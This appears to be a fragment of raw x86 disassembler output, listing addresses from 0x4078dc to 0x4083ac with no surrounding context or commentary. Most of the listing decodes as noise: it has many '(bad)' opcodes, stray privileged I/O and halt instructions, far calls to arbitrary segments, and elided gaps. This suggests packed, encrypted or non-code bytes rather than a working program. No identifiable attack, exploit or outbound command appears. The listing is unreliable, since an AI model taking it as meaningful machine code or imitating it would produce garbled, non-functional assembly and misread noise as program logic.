  4078dc:	push   eax
  4078dd:	aas    
  4078de:	call   0x9c7170
  4078e3:	loop   0x4078e2
  4078e5:	(bad)  
  4078e6:	sbb    esi,ebp
  4078e8:	dec    ebx
  4078e9:	imul   edi,edi,0x5c
  4078ec:	mov    edx,0x4254ffab
  4078f1:	xor    eax,DWORD PTR [ebx]
  4078f3:	xlat   BYTE PTR ds:[ebx]
  4078f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078f5:	inc    eax
  4078f6:	mov    esi,DWORD PTR [ecx+0x0]
	...
  407920:	add    BYTE PTR [eax],al
  407922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407923:	(bad)  
  407924:	cld    
  407925:	shr    DWORD PTR [edi+0x16],1
  407928:	add    cl,ch
  40792a:	aam    0xc6
  40792c:	or     al,0xc1
  40792e:	outs   dx,DWORD PTR ds:[esi]
  40792f:	daa    
  407930:	jmp    FWORD PTR [esi-0x4fa4e34f]
  407936:	or     BYTE PTR [edi+0x0],0x34
  40793a:	shr    DWORD PTR [edi],0x81
  40793d:	lods   eax,DWORD PTR ds:[esi]
  40793e:	xor    al,BYTE PTR [ecx-0x1]
  407941:	mov    ?,WORD PTR [edi-0x3eff8e2a]
  407947:	in     al,0xfe
  407949:	push   eax
  40794a:	dec    edi
  40794b:	push   esi
  40794c:	add    DWORD PTR [eax],eax
  40794e:	push   edi
  40794f:	hlt    
  407950:	pop    ss
  407951:	(bad)  
  407952:	push   edi
  407953:	pop    esp
  407954:	leave  
  407955:	ret    
  407956:	call   0x54:0x7283ebd1
  40795d:	je     0x4079af
  40795f:	fnstcw WORD PTR [eax+edx*1+0x57]
  407963:	push   eax
  407964:	sbb    edi,edi
  407966:	cli    
  407967:	das    
  407968:	(bad)  
  407969:	jne    0x40799a
  40796b:	hlt    
  40796c:	(bad)  
  40796e:	jo     0x407954
  407970:	(bad)  
  407971:	jne    0x40797a
  407973:	in     eax,0x74
  407975:	or     al,0x60
  407977:	push   0x8
  407979:	call   0x3f8696
  40797e:	pop    esi
  40797f:	sbb    DWORD PTR [eax],edx
  407981:	add    dl,cl
  407983:	shr    bl,1
  407985:	add    DWORD PTR [eax],0x0
	...
  4079b0:	ret    0x53
  4079b3:	je     0x4079c8
  4079b5:	fnstcw WORD PTR [esp+ecx*1-0x29]
  4079b9:	dec    edi
  4079ba:	push   ss
  4079bb:	jmp    FWORD PTR [edx+0x4c]
  4079be:	(bad)  
  4079bf:	jne    0x407990
  4079c1:	repz mov dl,0xd6
  4079c4:	lock in al,0xfe
  4079c7:	jne    0x4079ac
  4079c9:	in     al,0x74
  4079cb:	or     bh,bh
  4079cd:	dec    ebp
  4079ce:	xlat   BYTE PTR ds:[ebx]
  4079cf:	inc    DWORD PTR [eax-0x58f33df2]
  4079d5:	mov    cl,BYTE PTR [ebx-0xfffeb14]
  4079db:	jmp    FWORD PTR [edx+0x53]
  4079de:	call   0xff24fa28
  4079e3:	mov    DWORD PTR [edx+0x53],ebx
  4079e6:	cmp    DWORD PTR [ebp+0x3e],0x36
  4079ea:	add    esi,DWORD PTR [eax+ebp*8-0x30]
  4079ee:	(bad)  
  4079f0:	data16 cmp BYTE PTR [ecx-0x3cb38e01],0x74
  4079f8:	cld    
  4079f9:	mov    dh,0x40
  4079fb:	lock push cs
  4079fd:	mov    cl,0x10
  4079ff:	or     al,0x66
  407a01:	sub    DWORD PTR [edx-0x3cb3ae01],edi
  407a07:	je     0x407a15
  407a09:	mov    bl,0x18
  407a0b:	cld    
  407a0c:	ds xor dh,bl
  407a0f:	jmp    FWORD PTR [esp+edx*2+0x759b]
	...
  407a3e:	xor    bh,BYTE PTR [esi+0x10]
  407a41:	clc    
  407a42:	push   ss
  407a43:	mov    ah,BYTE PTR [ebp-0x3cc5de01]
  407a49:	jne    0x407a7a
  407a4b:	jne    0x407a5d
  407a4d:	adc    BYTE PTR [ecx],dl
  407a4f:	call   0x6cd479ea
  407a54:	call   0xf9ff:0x4a5c3675
  407a5b:	push   ebp
  407a5c:	mov    BYTE PTR [ebp-0x12],al
  407a5f:	in     al,0xaa
  407a61:	(bad)  
  407a62:	or     DWORD PTR [esi-0x67],eax
  407a65:	jmp    FWORD PTR [ebx+0x20]
  407a68:	stos   DWORD PTR es:[edi],eax
  407a69:	xchg   bh,dh
  407a6b:	xor    eax,0x30fcc999
  407a70:	add    edx,DWORD PTR [ebp-0x4b]
  407a73:	sbb    BYTE PTR [ebp+0xf0dcec4],al
  407a79:	or     al,0xa6
  407a7b:	loopne 0x407a36
  407a7d:	push   DWORD PTR [ecx-0x42f3c035]
  407a83:	xchg   DWORD PTR [eax],ecx
  407a85:	add    BYTE PTR [edx],ch
  407a87:	jne    0x407a22
  407a89:	jne    0x407ad5
  407a8b:	pop    ebx
  407a8c:	xchg   ecx,eax
  407a8d:	inc    esp
  407a8e:	jo     0x407ace
  407a90:	sahf   
  407a91:	or     eax,0x86dac77e
  407a96:	sti    
  407a97:	dec    edx
  407a98:	cmp    DWORD PTR [ecx-0x6e6eb10d],ebx
  407a9e:	nop
  407a9f:	ds jle 0x407aaf
	...
  407aca:	add    BYTE PTR [eax],al
  407acc:	jle    0x407a95
  407ace:	retf   0xe382
  407ad1:	ds jmp 0xda9ba8da
  407ad7:	repnz push eax
  407ad9:	enter  0x98f9,0xd3
  407add:	ds push esi
  407adf:	cmovbe edi,DWORD PTR [esi]
  407ae2:	aam    0xb
  407ae4:	xor    BYTE PTR es:[edi-0x67],al
  407ae8:	xor    eax,edx
  407aea:	mov    ds:0xcd338e93,eax
  407aef:	mov    eax,0xf2e3e21
  407af4:	dec    edx
  407af5:	xor    ecx,ebp
  407af7:	mov    edx,0xc6303e11
  407afc:	cmp    bl,BYTE PTR [ebx-0x44]
  407aff:	mov    WORD PTR [edx],ss
  407b01:	fisub  DWORD PTR [esp+edx*4]
  407b04:	lea    esi,[edx+0x22]
  407b07:	cdq    
  407b08:	imul   edx,DWORD PTR [ebx+0x11],0x29
  407b0c:	or     BYTE PTR [esi],bh
  407b0e:	test   BYTE PTR [edx+0x176a537b],0x46
  407b15:	pop    ebx
  407b16:	pop    ebp
  407b17:	inc    edx
  407b18:	rol    edi,1
  407b1a:	icebp  
  407b1b:	stos   DWORD PTR es:[edi],eax
  407b1c:	in     eax,0x1f
  407b1e:	(bad)  
  407b1f:	cwde   
  407b20:	xor    eax,0xcad6551b
  407b25:	xchg   edi,eax
  407b26:	mov    ecx,0xf1c7b133
  407b2b:	stos   DWORD PTR es:[edi],eax
  407b2c:	int3   
  407b2d:	sbb    al,0x0
  407b2f:	mov    dh,0x0
	...
  407b59:	add    dh,al
  407b5b:	push   ecx
  407b5c:	shl    BYTE PTR ds:0xa57cdaa0,0x3d
  407b63:	pop    ebx
  407b64:	adc    cl,ch
  407b66:	xor    ch,BYTE PTR [ebx-0x1]
  407b69:	sbb    al,0xa6
  407b6b:	cmp    eax,0x77a59175
  407b70:	loop   0x407af8
  407b72:	(bad)  
  407b73:	push   ecx
  407b74:	shl    ch,0x3c
  407b77:	call   0xe9e8:0xaaca2c8d
  407b7e:	xchg   esi,eax
  407b7f:	cmp    eax,0x534066ff
  407b84:	call   0xff7e00b2
  407b89:	bound  edi,QWORD PTR [edx-0x5f]
  407b8c:	leave  
  407b8d:	sub    edi,DWORD PTR [ecx]
  407b8f:	cmp    eax,0xdad97254
  407b94:	ret    
  407b95:	jne    0x407b5e
  407b97:	cmp    al,0xff
  407b99:	mov    al,cs:0xb62efe03
  407b9f:	pop    ebx
  407ba0:	add    cl,ch
  407ba2:	cmp    eax,0x3aed44d0
  407ba7:	sbb    esi,DWORD PTR [esp+ebp*8-0x43]
  407bab:	add    DWORD PTR [eax],0xffffff94
  407bae:	clc    
  407baf:	xor    edi,DWORD PTR [eax-0x18]
  407bb2:	cmp    eax,0x4174ff5b
  407bb7:	xor    ebx,ebp
  407bb9:	or     al,dh
  407bbb:	cmp    al,0xb
  407bbd:	sub    DWORD PTR [eax],eax
	...
  407be7:	add    BYTE PTR [eax+0x4c],cl
  407bea:	push   0x9a79b7
  407bef:	fisubr WORD PTR [edi]
  407bf1:	dec    edi
  407bf2:	call   0xff7d05e9
  407bf7:	ret    0xb347
  407bfa:	rol    DWORD PTR [eax],cl
  407bfc:	push   0x72ff0096
  407c01:	push   ebx
  407c02:	call   0xff254713
  407c07:	mov    DWORD PTR [edx],esp
  407c09:	lahf   
  407c0a:	(bad)  
  407c0b:	(bad)  
  407c0c:	fsubr  DWORD PTR [edi+0x3e]
  407c0f:	add    DWORD PTR [edi-0x2a7a72a8],edx
  407c15:	in     eax,0xfe
  407c17:	push   DWORD PTR [edi]
  407c19:	out    dx,eax
  407c1a:	sbb    eax,0xffffffb8
  407c1d:	in     al,0x8c
  407c1f:	test   DWORD PTR [ebp+0x47fffee5],edx
  407c25:	in     al,0xb4
  407c27:	mov    eax,0xe8fee3e9
  407c2c:	mov    cl,0x18
  407c2e:	add    BYTE PTR [eax],al
  407c30:	into   
  407c31:	fnstcw WORD PTR [ebx+0x3fe3e8fe]
  407c37:	bt     DWORD PTR [ecx+0x0],eax
  407c3b:	add    BYTE PTR [edi],ah
  407c3d:	rcl    DWORD PTR [edx+eax*8-0x8011b97],cl
  407c44:	adc    eax,0x27ffff48
  407c49:	push   ebp
  407c4a:	test   BYTE PTR [ebx+0x0],al
	...
  407c74:	add    BYTE PTR [eax],al
  407c76:	daa    
  407c77:	pop    eax
  407c78:	add    BYTE PTR [ebp+0x684f33d5],cl
  407c7e:	pop    esi
  407c7f:	xchg   esp,eax
  407c80:	inc    ecx
  407c81:	add    BYTE PTR [edi],bh
  407c83:	aam    0xc2
  407c85:	add    bh,ah
  407c87:	push   eax
  407c88:	shl    BYTE PTR [ebp-0x1e],0xee
  407c8c:	retf   
  407c8d:	add    bh,dl
  407c8f:	push   edi
  407c90:	lea    edx,[ebp-0x11adb]
  407c96:	dec    edx
  407c97:	call   0x414f:0x106f502c
  407c9e:	xor    ch,BYTE PTR ds:[ebx+0x3317d72]
  407ca5:	or     edi,DWORD PTR [esi+0x7e]
  407ca8:	add    ecx,ebp
  407caa:	fnstenv [ecx]
  407cac:	add    eax,DWORD PTR [eax]
  407cae:	mov    eax,ds:0x57e8087e
  407cb3:	adc    DWORD PTR [esi+0xff245ff],edx
  407cb9:	movlhps xmm1,xmm0
  407cbc:	dec    ebx
  407cbd:	inc    ecx
  407cbe:	ds in  eax,0xf
  407cc1:	or     al,0x66
  407cc3:	fs mov ebx,0x8e871ff
  407cc9:	push   0x3e
  407ccb:	mov    ebp,0x58560c10
  407cd0:	mov    ebx,0x709e59ff
  407cd5:	ret    0xb450
  407cd8:	xchg   esi,eax
  407cd9:	lea    eax,[eax]
	...
  407d03:	add    ah,ch
  407d05:	dec    ebp
  407d06:	xor    dl,BYTE PTR [eax+0x56]
  407d09:	aam    0xb9
  407d0b:	(bad)  
  407d0c:	cmp    ebp,esi
  407d0e:	xchg   ebp,eax
  407d0f:	jne    0x407d67
  407d11:	mov    eax,ds:0xf0291410
  407d16:	repnz dec edi
  407d18:	and    eax,edi
  407d1a:	or     ch,al
  407d1c:	push   cs
  407d1d:	mov    edx,DWORD PTR [esi-0x5156d901]
  407d23:	dec    DWORD PTR [ecx]
  407d25:	dec    esi
  407d26:	and    ecx,DWORD PTR [ebp-0x7a73df84]
  407d2c:	mov    dl,0x6a
  407d2e:	xchg   esi,eax
  407d2f:	(bad)  
  407d30:	mov    ebp,0x72fff2df
  407d35:	inc    esi
  407d36:	stos   BYTE PTR es:[edi],al
  407d37:	adc    ah,cl
  407d39:	mov    bh,0xf3
  407d3b:	(bad)  
  407d3c:	xchg   ebx,eax
  407d3d:	jo     0x407cd4
  407d3f:	call   ecx
  407d41:	pop    ebx
  407d42:	ror    DWORD PTR [ebp+0x8e95bfd],1
  407d48:	(bad)  
  407d49:	scas   eax,DWORD PTR es:[edi]
  407d4a:	adc    al,0x2c
  407d4c:	les    esp,FWORD PTR [ebx-0x4f4efbd8]
  407d52:	cmc    
  407d53:	stos   DWORD PTR es:[edi],eax
  407d54:	dec    edi
  407d55:	push   ss
  407d56:	mov    esi,0x7cf0a195
  407d5b:	xchg   esi,eax
  407d5c:	cdq    
  407d5d:	cmp    bl,BYTE PTR [ecx]
  407d5f:	lods   al,BYTE PTR ds:[esi]
  407d60:	not    DWORD PTR ds:0xddee95a6
  407d66:	sbb    edi,esp
	...
  407d90:	add    BYTE PTR [eax],al
  407d92:	sub    DWORD PTR [esi+0x4ef394e5],0x62eb9539
  407d9c:	xchg   BYTE PTR [edi],ch
  407d9e:	inc    esi
  407d9f:	inc    esi
  407da0:	in     eax,dx
  407da1:	xchg   esp,eax
  407da2:	jmp    0x407df2
  407da4:	sbb    DWORD PTR [ebp+0x308162d3],edx
  407daa:	push   ebx
  407dab:	cmp    ah,BYTE PTR [esi-0x54]
  407dae:	cld    
  407daf:	adc    DWORD PTR [esi-0x6b],ebx
  407db2:	mov    bl,0xe0
  407db4:	sub    dl,BYTE PTR [esi-0x6b46c5c7]
  407dba:	jmp    0x407db2
  407dbc:	inc    esi
  407dbd:	xchg   ebp,eax
  407dbe:	sub    DWORD PTR [ebx-0x71],eax
  407dc1:	ret    0x5b3e
  407dc4:	ins    BYTE PTR es:[edi],dx
  407dc5:	les    ecx,FWORD PTR [ecx-0x20]
  407dc8:	aaa    
  407dc9:	xchg   esi,eax
  407dca:	adc    DWORD PTR [edx],edi
  407dcc:	es dec edi
  407dce:	retf   0x1e38
  407dd1:	xchg   ebp,eax
  407dd2:	push   ss
  407dd3:	cld    
  407dd4:	sub    al,BYTE PTR [esi+edi*1]
  407dd7:	cmp    dl,BYTE PTR [esp+ebx*2-0x10]
  407ddb:	cmp    DWORD PTR [esi],eax
  407ddd:	lods   al,BYTE PTR ds:[esi]
  407dde:	dec    esp
  407ddf:	adc    bh,dh
  407de1:	xchg   esp,eax
  407de2:	neg    DWORD PTR [eax+eax*1]
  407de5:	fnstsw WORD PTR ds:0x27fd8b90
  407deb:	pop    ebx
  407dec:	call   FWORD PTR [esi+ecx*8+0x38]
  407df0:	jne    0x407deb
  407df2:	stos   BYTE PTR es:[edi],al
  407df3:	scas   eax,DWORD PTR es:[edi]
  407df4:	or     al,0xd6
	...
  407e1e:	add    BYTE PTR [eax],al
  407e20:	dec    eax
  407e21:	arpl   ax,bp
  407e23:	push   cs
  407e24:	enter  0xff39,0xb0
  407e28:	jg     0x407e74
  407e2a:	add    BYTE PTR [edi+esi*4],dl
  407e2d:	inc    esi
  407e2e:	(bad)  
  407e2f:	cmp    al,0x46
  407e31:	inc    ebx
  407e32:	inc    ecx
  407e33:	xchg   edx,eax
  407e34:	stos   BYTE PTR es:[edi],al
  407e35:	cmp    DWORD PTR [ebx],ecx
  407e37:	test   eax,0x14ff5939
  407e3c:	mov    ch,BYTE PTR [ecx+0x39b7a6e8]
  407e42:	(bad)  
  407e43:	cmp    ebx,ecx
  407e45:	scas   eax,DWORD PTR es:[edi]
  407e46:	sbb    BYTE PTR [esi+0x7e504f38],al
  407e4c:	xor    BYTE PTR [ebx-0x18],ah
  407e4f:	aaa    
  407e50:	mov    dl,0x39
  407e52:	inc    DWORD PTR [ecx+0x66ff1092]
  407e58:	je     0x407e76
  407e5a:	adc    al,0xe9
  407e5c:	adc    dh,ah
  407e5e:	jmp    0x407eb6
  407e60:	dec    eax
  407e61:	dec    edi
  407e62:	call   esp
  407e64:	sub    eax,0x57f5753a
  407e69:	push   ebp
  407e6a:	push   DWORD PTR [ebp+esi*1-0x4dc946bd]
  407e71:	cmp    bh,bh
  407e73:	mov    ah,0x21
  407e75:	cmp    dh,BYTE PTR [ebp-0x7]
  407e78:	mov    dl,0xae
  407e7a:	or     al,0x93
  407e7c:	push   ds
  407e7d:	cmp    dh,BYTE PTR [ebp-0x1f]
  407e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e81:	add    edi,edi
  407e83:	push   cs
	...
  407eac:	add    BYTE PTR [eax],al
  407eae:	retf   0x7538
  407eb1:	add    BYTE PTR [ebx],cl
  407eb3:	shl    BYTE PTR [eax+edx*1-0x20],1
  407eb7:	data16 or al,0x6a
  407eba:	repz iret 
  407ebc:	je     0x407ec6
  407ebe:	aas    
  407ebf:	stos   DWORD PTR es:[edi],eax
  407ec0:	(bad)  
  407ec1:	jmp    eax
  407ec3:	test   cl,0x10
  407ec6:	xlat   BYTE PTR ds:[ebx]
  407ec7:	jae    0x407e54
  407ec9:	in     al,dx
  407eca:	and    al,0x23
  407ecc:	lock push ebx
  407ece:	imul   esi,DWORD PTR [ebx+ebp*1-0x25],0xff0ca22c
  407ed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ed7:	fld    QWORD PTR [eax+edi*8-0x30]
  407edb:	push   edx
  407edc:	or     BYTE PTR [edi+0x45c6cb5a],cl
  407ee2:	stos   DWORD PTR es:[edi],eax
  407ee3:	pop    edi
  407ee4:	add    BYTE PTR [eax],al
  407ee6:	xchg   edi,eax
  407ee7:	loope  0x407f25
  407ee9:	mov    BYTE PTR [esi+ebx*4],bl
  407eec:	add    BYTE PTR [eax],al
  407eee:	dec    ebx
  407eef:	imul   eax,DWORD PTR [ebx+0x745c6f7d],0x56
  407ef6:	shl    BYTE PTR [ecx+0x5e3d50f0],cl
  407efc:	push   0x0
  407efe:	cmp    eax,0x477d835f
  407f03:	pop    esp
  407f04:	je     0x407f0b
  407f06:	loopne 0x407f59
  407f08:	adc    bl,ch
  407f0a:	and    eax,0x276a0056
  407f0f:	fild   DWORD PTR [eax+edi*8+0x0]
	...
  407f3b:	add    bh,al
  407f3d:	int3   
  407f3e:	adc    al,0x88
  407f40:	in     al,dx
  407f41:	sahf   
  407f42:	add    BYTE PTR [ebx],cl
  407f44:	addr16 push ebx
  407f46:	das    
  407f47:	and    edx,0xffffffcf
  407f4a:	push   DWORD PTR [ebx-0x12]
  407f4d:	mov    eax,0x9a8c0c45
  407f52:	lock cmp edi,DWORD PTR [esi]
  407f55:	cmp    bl,BYTE PTR [edx]
  407f57:	pop    ss
  407f58:	jge    0x407fc0
  407f5a:	jg     0x407fd1
  407f5c:	repnz lods al,BYTE PTR ds:[esi]
  407f5e:	adc    DWORD PTR [eax],ecx
  407f60:	mov    ch,0x6
  407f62:	xchg   ebx,eax
  407f63:	jecxz  0x407fa1
  407f65:	xor    eax,0x167b8b67
  407f6a:	xchg   edx,eax
  407f6b:	jne    0x407f3b
  407f6d:	mov    al,0x3
  407f6f:	dec    DWORD PTR [ebx+0xe]
  407f72:	fwait
  407f73:	out    0x7e,al
  407f75:	inc    ecx
  407f76:	add    ecx,DWORD PTR [ebx+0x5b32887d]
  407f7c:	ja     0x407f81
  407f7e:	(bad)  
  407f7f:	dec    DWORD PTR [edx]
  407f81:	lods   eax,DWORD PTR ds:[esi]
  407f82:	lahf   
  407f83:	add    DWORD PTR [edx-0x16a9ca13],0xffffff99
  407f8a:	out    0x4f,eax
  407f8c:	inc    DWORD PTR [ecx-0x65]
  407f8f:	ins    BYTE PTR es:[edi],dx
  407f90:	jg     0x407fd3
  407f92:	add    ecx,DWORD PTR [ebx-0x3b7f76a]
  407f98:	ds inc edx
  407f9a:	add    eax,DWORD PTR [eax]
  407f9c:	xor    eax,0x3e1702
	...
  407fc9:	add    dh,dl
  407fcb:	dec    eax
  407fcc:	xor    eax,DWORD PTR [ecx+0x3e]
  407fcf:	push   ebp
  407fd0:	pushf  
  407fd1:	hlt    
  407fd2:	jle    0x408015
  407fd4:	add    ecx,DWORD PTR [ebx]
  407fd6:	jle    0x407fed
  407fd8:	loop   0x407f64
  407fda:	dec    esi
  407fdb:	or     ebx,edx
  407fdd:	dec    edi
  407fde:	jg     0x408024
  407fe0:	ss call 0x440503
  407fe6:	xor    eax,0xb51e1784
  407feb:	pushf  
  407fec:	add    BYTE PTR [ebp+0x1a],0xd5
  407ff0:	call   0x950:0x344feec
  407ff7:	pop    esp
  407ff8:	xchg   BYTE PTR ds:[ebx+0x4417e937],al
  407fff:	repz out 0x3,eax
  408002:	ds pop ebx
  408004:	scas   al,BYTE PTR es:[edi]
  408005:	xor    DWORD PTR [ebp+0x3e4b2a24],eax
  40800b:	pop    ebx
  40800c:	jmp    0x92d5f914
  408011:	mov    esp,0x9f6290fd
  408016:	mov    ebp,0x385d91f
  40801b:	lahf   
  40801c:	xor    al,BYTE PTR [ebx+0x3e]
  40801f:	pop    ebx
  408020:	pop    ebp
  408021:	idiv   BYTE PTR [eax+edi*2+0x5aff3d21]
  408028:	jmp    0xfc1ab744
  40802d:	aas    
	...
  408056:	add    BYTE PTR [eax],al
  408058:	add    eax,0xb03e99c
  40805d:	pop    esi
  40805e:	jno    0x408063
  408060:	ds pop ebx
  408062:	jmp    0x2428fe21
  408067:	mov    es,WORD PTR [eax-0x13616a5]
  40806d:	pop    ebx
  40806e:	jmp    0xe9997f3c
  408073:	leave  
  408074:	(bad)  
  408075:	pop    ecx
  408076:	jmp    0xe99f7f44
  40807b:	leave  
  40807c:	(bad)  
  40807d:	pop    edi
  40807e:	in     al,0x7e
  408080:	add    ebp,DWORD PTR [edi]
  408082:	mov    ecx,0xe9c13e1d
  408087:	sbb    eax,0x1de9c13e
  40808c:	ds shr ecx,0x1b
  408090:	pop    esi
  408091:	pop    ecx
  408092:	jmp    0xd3bc149a
  408097:	add    eax,0x33009fcb
  40809c:	dec    edx
  40809d:	ss adc eax,0x9c4aa5
  4080a3:	repnz std 
  4080a5:	scas   eax,DWORD PTR es:[edi]
  4080a6:	add    dh,BYTE PTR [eax]
  4080a8:	add    ebx,DWORD PTR [esi]
  4080aa:	inc    ebp
  4080ab:	sbb    DWORD PTR [edx],edi
  4080ad:	pop    ebx
  4080ae:	add    cl,ch
  4080b0:	push   0xce99f0a0
  4080b5:	scas   eax,DWORD PTR es:[edi]
  4080b6:	hlt    
  4080b7:	xchg   ebx,eax
  4080b8:	cmp    eax,0xa11536
	...
  4080e5:	add    BYTE PTR [edx],dl
  4080e7:	pushf  
  4080e8:	add    dl,ah
  4080ea:	std    
  4080eb:	scas   eax,DWORD PTR es:[edi]
  4080ec:	pop    es
  4080ed:	scas   al,BYTE PTR es:[edi]
  4080ee:	js     0x40811b
  4080f0:	add    cl,ch
  4080f2:	cmp    eax,0xd65cff5b
  4080f7:	xor    eax,0x9c6b1d15
  4080fc:	add    BYTE PTR [edx-0x8],dh
  4080ff:	sub    cl,cl
  408101:	stos   BYTE PTR es:[edi],al
  408102:	push   eax
  408103:	loop   0x4080f0
  408105:	push   0x79
  408107:	loop   0x408095
  408109:	and    al,0xa
  40810b:	mov    ebp,DWORD PTR [eax-0x42]
  40810e:	(bad)  
  40810f:	fwait
  408110:	add    BYTE PTR [ecx-0x6900c6b8],dl
  408116:	sub    eax,0x3415c062
  40811b:	fidivr DWORD PTR [ecx+esi*2+0x69]
  40811f:	lods   al,BYTE PTR ds:[esi]
  408120:	imul   ebp,DWORD PTR [eax+eax*1+0x2b],0x50
  408125:	adc    DWORD PTR [eax-0x3f16ffe6],0x3ec7781a
  40812f:	in     eax,dx
  408130:	inc    esp
  408131:	pop    esi
  408132:	ins    DWORD PTR es:[edi],dx
  408133:	fs mov dh,0xac
  408136:	iret   
  408137:	mov    ecx,DWORD PTR [edi]
  408139:	xchg   edi,eax
  40813a:	xor    BYTE PTR [esi],0x50
  40813d:	add    BYTE PTR [eax],ch
  40813f:	xchg   ebx,eax
  408140:	inc    ebp
  408141:	cld    
  408142:	mov    bh,0x5b
  408144:	mov    dh,0x45
  408146:	dec    esp
  408147:	push   0xb60f
	...
  408174:	loop   0x40815c
  408176:	dec    edi
  408177:	punpcklwd mm3,DWORD PTR [ebp-0x6d17af07]
  40817e:	inc    ebp
  40817f:	clc    
  408180:	mov    bh,0x5b
  408182:	mov    bh,0x45
  408184:	push   ecx
  408185:	push   0xcc92b70f
  40818a:	dec    edi
  40818b:	call   DWORD PTR [edx-0x38]
  40818e:	fcomp  QWORD PTR [bx+si+0x99]
  408193:	lea    esp,[edx-0x4617af4c]
  408199:	pop    ds
  40819a:	add    BYTE PTR [eax],al
  40819c:	and    al,0x23
  40819e:	xor    al,0x8d
  4081a0:	(bad)  
  4081a1:	fisttp DWORD PTR [edi-0x18]
  4081a4:	dec    ecx
  4081a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081a6:	add    BYTE PTR [eax],al
  4081a8:	inc    edi
  4081a9:	fiadd  DWORD PTR [esp+ecx*4+0x37]
  4081ad:	push   edi
  4081ae:	xlat   BYTE PTR ds:[ebx]
  4081af:	dec    edi
  4081b0:	pop    di
  4081b2:	call   0xff24f9a4
  4081b7:	call   0x3f74ef
  4081bc:	scas   al,BYTE PTR es:[edi]
  4081bd:	sbb    BYTE PTR [ebp-0x75],dl
  4081c0:	mov    ebx,0xb82cc3de
  4081c5:	in     al,0xfe
  4081c7:	push   ebx
  4081c8:	inc    eax
  4081c9:	push   ecx
  4081ca:	add    BYTE PTR [edx+0x67],ch
  4081cd:	in     eax,0x74
  4081cf:	or     BYTE PTR [edi-0x27002f28],bh
  4081d5:	mov    ch,0x45
  4081d7:	cld    
	...
  408200:	add    BYTE PTR [eax],al
  408202:	outs   dx,DWORD PTR ds:[esi]
  408203:	pop    edi
  408204:	add    bh,ch
  408206:	(bad)  
  408208:	je     0x408212
  40820a:	ds call 0x9c1c:0xa529d0a0
  408212:	ds inc edx
  408214:	add    ecx,DWORD PTR [ebp-0x71de3d]
  40821a:	adc    edx,edx
  40821c:	call   0xbbc7:0x8f84f258
  408223:	loope  0x4081b2
  408225:	(bad)  
  408226:	stc    
  408227:	mov    ch,0x4
  408229:	add    BYTE PTR [esi],bh
  40822b:	mov    edi,0x64e96089
  408230:	(bad)  
  408231:	push   eax
  408232:	(bad)  
  408233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408234:	dec    edi
  408235:	add    BYTE PTR [esi],bh
  408237:	or     DWORD PTR [ebx+ebp*1+0x7451beec],edi
  40823e:	leave  
  40823f:	inc    esp
  408240:	mov    gs,ebx
  408242:	sub    eax,0x32ffcec2
  408247:	aas    
  408248:	dec    ecx
  408249:	add    DWORD PTR [esi],edi
  40824b:	inc    edx
  40824c:	add    ecx,DWORD PTR [ebx]
  40824e:	mov    WORD PTR [ebp+0x4239c603],cs
  408254:	inc    esi
  408255:	inc    ecx
  408256:	mov    edi,0x3e00831a
  40825b:	inc    edx
  40825c:	adc    ebp,esp
  40825e:	xor    eax,0x16161702
  408263:	fiadd  WORD PTR [edx]
	...
  40828d:	add    BYTE PTR [eax],al
  40828f:	add    BYTE PTR [esi],bh
  408291:	(bad)  
  408292:	mov    BYTE PTR [eax+0x71],ah
  408295:	int3   
  408296:	lea    edx,[eax+0x69]
  408299:	dec    esi
  40829a:	cld    
  40829b:	out    0xa2,eax
  40829d:	ror    DWORD PTR [ebp+0x194565ff],1
  4082a3:	add    ah,ah
  4082a5:	inc    ecx
  4082a6:	mov    ?,WORD PTR [ebp+0x36]
  4082a9:	ficomp DWORD PTR [eax+edx*8+0x41]
  4082ad:	pop    edx
  4082ae:	data16 fwait
  4082b0:	or     esi,DWORD PTR [ecx]
  4082b2:	pop    esi
  4082b3:	mov    cs,WORD PTR [esi+0x21fbdc32]
  4082b9:	(bad)  
  4082ba:	cmp    DWORD PTR [esi+0x7e9c421],ecx
  4082c0:	ds pop ebx
  4082c2:	push   ecx
  4082c3:	(bad)
  4082c6:	ss jl  0x40828c
  4082c9:	(bad)  
  4082ca:	mov    es,WORD PTR cs:[ecx]
  4082cd:	les    esp,FWORD PTR [esi]
  4082cf:	add    bh,BYTE PTR [esi]
  4082d1:	pop    ebx
  4082d2:	push   ds
  4082d3:	pop    eax
  4082d4:	xchg   edx,eax
  4082d5:	xor    dl,BYTE PTR [esi]
  4082d7:	mov    ss,WORD PTR [esi+0x5d]
  4082da:	stc    
  4082db:	add    edi,DWORD PTR [esi]
  4082dd:	ret    
  4082de:	jmp    0x119bc0ea
  4082e3:	call   0x3429de78
  4082e8:	leave  
  4082e9:	call   0x3302117a
  4082ee:	out    0x17,al
  4082f0:	inc    esi
  4082f1:	inc    ebx
  4082f2:	inc    esi
  4082f3:	mov    ah,0x0
	...
  40831d:	add    BYTE PTR [ecx+0x3d8d4132],dh
  408323:	pop    ebx
  408324:	jmp    0xc6d06eb5
  408329:	lea    ebx,[ecx-0x6e0c173d]
  40832f:	xor    al,BYTE PTR [ecx+0x4]
  408332:	inc    edx
  408333:	pop    ebx
  408334:	jmp    0xe93205d4
  408339:	add    ecx,DWORD PTR [esi]
  40833b:	xor    dl,BYTE PTR [eax+esi*1+0x71]
  40833f:	xor    dl,BYTE PTR [esi-0x7e9d0c73]
  408345:	into   
  408346:	jno    0x40837a
  408348:	xchg   BYTE PTR [ebx+eax*4-0x117281d0],bl
  40834f:	xor    DWORD PTR [eax],eax
  408351:	cld    
  408352:	inc    ebp
  408353:	cmp    bh,dl
  408355:	sahf   
  408356:	mov    bl,0x32
  408358:	call   0xff724f15
  40835d:	ins    BYTE PTR es:[edi],dx
  40835e:	mov    ecx,0xbb56ff92
  408363:	mov    ch,BYTE PTR [eax+0x36]
  408366:	arpl   WORD PTR [eax+eax*1-0xc532af],bx
  40836d:	ds xchg ebp,eax
  40836f:	fcom   DWORD PTR [ebx+0x36]
  408372:	mov    ebx,0x466c8331
  408377:	xor    bh,bh
  408379:	es inc edx
  40837b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40837c:	inc    ebp
  40837d:	push   0xffffff81
  40837f:	xchg   ebx,eax
  408380:	call   DWORD PTR [esi]
	...
  4083aa:	add    BYTE PTR [eax],al
  4083ac:	mov    ebx,0xbecd7246
